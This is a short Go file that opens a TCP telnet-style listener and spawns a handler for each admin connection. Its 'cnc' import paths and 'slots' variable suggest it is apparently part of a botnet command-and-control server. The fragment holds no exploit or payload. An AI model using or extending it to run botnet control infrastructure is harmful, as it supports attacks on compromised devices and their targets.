package masters

import (
	"cnc/core/config"
	"cnc/core/masters/sessions"
	"fmt"
	"net"
)

type Admin struct {
	conn    net.Conn
	Session *sessions.Session
}

var GlobalSlots int

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn: conn, Session: nil}
}

func Listen() {
	tel, err := net.Listen("tcp", fmt.Sprintf("%s:%d", config.Config.Server.Host, config.Config.Server.Port)) /* telnet listener */
	if err != nil {
		fmt.Println(err)
	}

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
}
